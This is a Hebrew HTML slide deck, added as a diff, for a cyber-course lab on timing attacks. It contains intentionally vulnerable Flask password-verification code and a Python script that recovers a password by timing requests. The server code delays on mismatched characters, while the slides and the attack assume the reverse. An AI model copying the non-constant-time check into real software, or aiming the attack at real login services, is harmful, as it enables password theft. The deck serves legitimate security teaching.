@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>התקפת Timing Attack - פרויקט HackIt</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            overflow: hidden;
+        }
+
+        .presentation {
+            width: 100vw;
+            height: 100vh;
+            position: relative;
+        }
+
+        .slide {
+            width: 100%;
+            height: 100%;
+            position: absolute;
+            top: 0;
+            left: 0;
+            display: none;
+            padding: 60px;
+            background: white;
+            opacity: 0;
+            transform: translateX(100px);
+            transition: all 0.5s ease;
+        }
+
+        .slide.active {
+            display: block;
+            opacity: 1;
+            transform: translateX(0);
+        }
+
+        .slide-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        h1 {
+            font-size: 3.5em;
+            color: #2d3748;
+            margin-bottom: 20px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
+        }
+
+        h2 {
+            font-size: 2.5em;
+            color: #667eea;
+            margin-bottom: 30px;
+            border-bottom: 4px solid #667eea;
+            padding-bottom: 10px;
+        }
+
+        h3 {
+            font-size: 1.8em;
+            color: #4a5568;
+            margin: 25px 0 15px;
+        }
+
+        p, li {
+            font-size: 1.3em;
+            line-height: 1.8;
+            color: #4a5568;
+            margin-bottom: 15px;
+        }
+
+        ul, ol {
+            margin-right: 40px;
+            font-size: 0.8em;
+        }
+
+        .highlight {
+            background: linear-gradient(120deg, #84fab0 0%, #8fd3f4 100%);
+            padding: 25px;
+            border-radius: 15px;
+            margin: 20px 0;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+        }
+
+        .code-block {
+            background: #1a202c;
+            color: #68d391;
+            padding: 20px;
+            border-radius: 10px;
+            font-family: 'Courier New', monospace;
+            font-size: 1.1em;
+            overflow-x: auto;
+            margin: 20px 0;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.3);
+            direction:ltr;
+        }
+
+        .two-column {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+            margin-top: 20px;
+        }
+
+        .column {
+            background: #f7fafc;
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+
+        .emoji {
+            font-size: 2em;
+            margin-left: 10px;
+        }
+
+        .controls {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            gap: 20px;
+            z-index: 1000;
+        }
+
+        button {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 1.1em;
+            border-radius: 30px;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+
+        button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+        }
+
+        .slide-number {
+            position: fixed;
+            top: 30px;
+            left: 30px;
+            background: rgba(255,255,255,0.9);
+            padding: 10px 20px;
+            border-radius: 20px;
+            font-weight: bold;
+            color: #667eea;
+            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
+        }
+
+        .title-slide {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            text-align: center;
+        }
+
+        .title-slide h1 {
+            color: white;
+            font-size: 4.5em;
+            text-shadow: 3px 3px 6px rgba(0,0,0,0.3);
+        }
+
+        .title-slide p {
+            color: rgba(255,255,255,0.9);
+            font-size: 1.5em;
+        }
+
+        .icon-list li {
+            position: relative;
+            padding-right: 40px;
+            margin-bottom: 20px;
+        }
+
+        .icon-list li:before {
+            content: "🔒";
+            position: absolute;
+            right: 0;
+            font-size: 1.5em;
+        }
+
+        .warning {
+            background: #fed7d7;
+            border-right: 5px solid #fc8181;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+
+        .success {
+            background: #c6f6d5;
+            border-right: 5px solid #48bb78;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+
+        .stats-box {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            color: white;
+            padding: 30px;
+            border-radius: 15px;
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .stats-box h3 {
+            color: white;
+            font-size: 3em;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        .animated {
+            animation: pulse 2s infinite;
+        }
+    </style>
+</head>
+<body>
+    <div class="presentation">
+        <div class="slide-number" id="slideNumber">1 / 10</div>
+
+        <!-- Slide 1: Title -->
+        <div class="slide active title-slide">
+            <div class="slide-content">
+                <h1>🔐 פרויקט HackIt</h1>
+                <h1 style="font-size: 3em; margin-top: 20px;">התקפת Timing Attack</h1>
+                <p style="margin-top: 40px;">מעבדה מעשית בפריצת אבטחה אתית</p>
+                <p> קורס סייבר מתקדם</p>
+            </div>
+        </div>
+
+        <!-- Slide 2: What is Timing Attack -->
+        <div class="slide">
+            <div class="slide-content">
+                <h2>מה זה Timing Attack? ⏱️</h2>
+                <div class="highlight">
+                    <p><strong>התקפת Timing Attack</strong> היא טכניקת פריצה שבה התוקף מנצל את השונות בזמני התגובה של המערכת כדי להסיק מידע על נתונים סודיים.</p>
+                </div>
+                <h3>איך זה עובד?</h3>
+                <ul class="icon-list">
+                    <li>השרת משווה את הסיסמה שלך תו-תו עם הסיסמה האמיתית</li>
+                    <li>כשתו נכון - השרת מבצע השהיה (delay) קטנה</li>
+                    <li>כשתו שגוי - השרת עונה מהר יותר</li>
+                    <li>על ידי מדידת זמני התגובה, אפשר "לנחש" את הסיסמה תו אחר תו!</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Slide 3: Project Goals -->
+        <div class="slide">
+            <div class="slide-content">
+                <h2>מטרות הפרויקט 🎯</h2>
+                <div class="two-column">
+                    <div class="column">
+                        <h3>שלב 1: בניית שרת</h3>
+                        <ul>
+                            <li>בניית שרת Flask בפייתון</li>
+                            <li>מימוש אלגוריתם Countermeasure </li>
+                            <li>הוספת delays אסטרטגיים</li>
+                            <li>פריסה ל-pythonanywhere</li>
+                        </ul>
+                    </div>
+                    <div class="column">
+                        <h3>שלב 2: כתיבת קוד התקפה</h3>
+                        <ul>
+                            <li>מדידת זמני תגובה</li>
+                            <li>ניתוח סטטיסטי של הנתונים</li>
+                            <li>שחזור הסיסמה תו-תו</li>
+                            <li>אופטימיזציה למהירות</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 4: Server Code Example -->
+        <div class="slide">
+            <div class="slide-content">
+                <h2>דוגמת קוד שרת 💻</h2>
+                <pre class="code-block">
+app = Flask(__name__)
+
+@app.route('/', methods=['GET','POST'])
+@app.route('/&ltstring:inPass&gt', methods=['GET','POST'])
+def index(inPass=''):
+    res = verifyPassword(inPass)
+    if res==True:
+        return '1'
+    else:
+        return '0'
+
+SECRET_PASSWORD = '1234'
+Delay=0.15
+longPadding  = '            '      # 12 spaces
+
+def verifyPassword(inPass):
+    result = True
+    #pad secret password and input password to same length
+    paddingInPassword = (longPadding + inPass)[-len(longPadding):]
+    paddedSecretPassword = (longPadding + SECRET_PASSWORD)[-len(longPadding):]
+    i = 0
+    for ch in paddedSecretPassword:
+        if paddingInPassword[i] != ch:
+            sleep(Delay)
+            result = False
+        i = i + 1
+    return result
+
+                </pre>
+                <div class="warning">
+                    <strong>⚠️ שימו לב:</strong>
+                    קוד זה פגיע במכוון! המשימה שלכם היא לנצל את הפגיעות הזו.<br>
+                    המטרה שלכם לכתוב אלגוריתם עם פגיעות לזמן שרק אתם תנצילחו לנצל.
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 5: Attack Algorithm -->
+        <div class="slide">
+            <div class="slide-content">
+                <h2>אלגוריתם ההתקפה 🔓</h2>
+                <pre class="code-block">
+def timing_attack():
+    password = ""
+    alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    
+    for position in range(12):  # עד 12 תווים
+        best_char = None
+        max_time = 0
+        
+        for char in alphabet:
+            # נסה את התו הזה
+            times = []
+            for _ in range(10):  # מדידה מרובה
+                start = time.perf_counter()
+                requests.get(f"{URL}/{password + char}")
+                times.append(time.perf_counter() - start)
+            
+            avg_time = statistics.mean(times)
+            if avg_time > max_time:
+                max_time = avg_time
+                best_char = char
+        
+        password += best_char
+        print(f"נמצא: {password}")
+                </pre>
+            </div>
+        </div>
+
+        <!-- Slide 6: Complexity Analysis -->
+        <div class="slide">
+            <div class="slide-content">
+                <h2>ניתוח מורכבות ⚡</h2>
+                <div class="two-column">
+                    <div class="stats-box">
+                        <h3>Brute Force</h3>
+                        <p style="font-size: 2em; margin-top: 20px;">62¹² ניסיונות</p>
+                        <p>(בלתי אפשרי!)</p>
+                    </div>
+                    <div class="stats-box" style="background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);">
+                        <h3>Timing Attack</h3>
+                        <p style="font-size: 2em; margin-top: 20px;">62 × 12 ניסיונות</p>
+                        <p>(אפשרי בקלות!)</p>
+                    </div>
+                </div>
+                <div class="success">
+                    <strong>✅ היתרון:</strong> במקום 62¹² = מספר אסטרונומי של ניסיונות, אנחנו צריכים רק 744 ניסיונות בערך! (עם מדידות מרובות כמובן)
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 7: Optimization Tips -->
+        <div class="slide">
+            <div class="slide-content">
+                <h2>טיפים לאופטימיזציה 🚀</h2>
+                <ul class="icon-list">
+                    <li><strong>מדידות מרובות:</strong> הריצו כל ניחוש 10-20 פעמים וחשבו ממוצע</li>
+                    <li><strong>סינון רעש:</strong> התעלמו מתוצאות קיצוניות (outliers)</li>
+                    <li><strong>מקביליות:</strong> שלחו מספר בקשות במקביל באמצעות threads</li>
+                    <li><strong>התאמת סף:</strong> קבעו סף דינמי בהתאם לשונות ברשת</li>
+                </ul>
+                <div class="highlight">
+                    <p><strong>💡 טיפ מקצועי:</strong> מדדו את ה-RTT (Round Trip Time) הבסיסי של הרשת שלכם והפחיתו אותו מכל המדידות!</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 8: Submission Requirements -->
+        <div class="slide">
+            <div class="slide-content">
+                <h2>דרישות ההגשה 📋</h2>
+                <h3>קבצים להגשה:</h3>
+                <ol>
+                    <li><strong>קוד שרת (server.py)</strong> - קוד ה-Flask המלא</li>
+                    <li><strong>קוד לקוח (attack.py)</strong> - האלגוריתם שפרץ את השרת</li>
+                    <li><strong>קישור pythonanywhere</strong> - שרת פעיל באינטרנט</li>
+                    <li><strong>דוח PDF</strong> הכולל:
+                        <ul>
+                            <li>פלט הרצה של ההתקפה</li>
+                            <li>השוואה: Brute Force vs Timing Attack</li>
+                            <li>אופטימיזציות שביצעתם</li>
+                            <li>התמודדות עם רעש רשת</li>
+                            <li>אמצעי הגנה שהוספתם לשרת</li>
+                        </ul>
+                    </li>
+                </ol>
+            </div>
+        </div>
+
+        <!-- Slide 9: Ethics and Safety -->
+        <div class="slide">
+            <div class="slide-content">
+                <h2>אתיקה ובטיחות ⚖️</h2>
+                <div class="warning">
+                    <h3>⚠️ חשוב מאוד!</h3>
+                    <ul>
+                        <li>זהו תרגיל לימודי בלבד!</li>
+                        <li>אסור לתקוף שרתים שאינם שלכם ללא אישור</li>
+                        <li>פריצה לא מורשית היא עבירה פלילית</li>
+                        <li>השתמשו בידע זה רק לטובה - הגנה על מערכות</li>
+                    </ul>
+                </div>
+                <div class="success">
+                    <h3>✅ שימוש אתי:</h3>
+                    <ul>
+                        <li>למידה והבנת פגיעויות אבטחה</li>
+                        <li>פיתוח מערכות מאובטחות יותר</li>
+                        <li>בדיקות חדירה מורשות בלבד</li>
+                        <li>שיתוף ידע למען אבטחה טובה יותר</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 10: Final Challenge -->
+        <div class="slide">
+            <div class="slide-content">
+                <h2>האתגר שלכם 🏆</h2>
+                <div class="highlight animated">
+                    <h3 style="text-align: center; font-size: 2em;">המטרה: לפרוץ כמה שיותר אתרים של קבוצות אחרות</h3>
+                </div>
+                <div class="two-column">
+                    <div class="column">
+                        <h3>נקודות הערכה:</h3>
+                        <ul>
+                            <li>שרת תקין עם אלגוריתם יחודי </li>
+                            <li>תיעוד וניתוח</li>
+                            <li>קוד שלכם פורץ את האתר שלכם</li>
+                            <li>מספר האתרים שהצלחתם לפרוץ</li>
+                            <li>מספר הקבוצות שפרצו לאתר שלכם</li>
+                        </ul>
+                    </div>
+                    <div class="column">
+                        <h3>בונוסים:</h3>
+                        <ul>
+                            <li>🧠 האלגוריתם החכם ביותר</li>
+                            <li>📊 הניתוח הסטטיסטי הטוב</li>
+                        </ul>
+                    </div>
+                </div>
+                <div style="text-align: center; margin-top: 40px;">
+                    <h3 style="font-size: 2em;">תאריך הגשה: יפורסם בקלאסרום</h3>
+                    <p style="font-size: 1.5em; margin-top: 20px;">בהצלחה! 🚀</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Navigation Controls -->
+        <div class="controls">
+            <button onclick="prevSlide()">◀ הקודם</button>
+            <button onclick="nextSlide()">הבא ▶</button>
+        </div>
+    </div>
+
+    <script>
+        let currentSlide = 0;
+        const slides = document.querySelectorAll('.slide');
+        const totalSlides = slides.length;
+
+        function updateSlideNumber() {
+            document.getElementById('slideNumber').textContent = `${currentSlide + 1} / ${totalSlides}`;
+        }
+
+        function showSlide(n) {
+            slides[currentSlide].classList.remove('active');
+            currentSlide = (n + totalSlides) % totalSlides;
+            slides[currentSlide].classList.add('active');
+            updateSlideNumber();
+        }
+
+        function nextSlide() {
+            showSlide(currentSlide + 1);
+        }
+
+        function prevSlide() {
+            showSlide(currentSlide - 1);
+        }
+
+        // Keyboard navigation
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'ArrowRight' || e.key === 'ArrowLeft') {
+                if (e.key === 'ArrowRight') prevSlide();
+                else nextSlide();
+            }
+        });
+
+        updateSlideNumber();
+    </script>
+</body>
+</html>
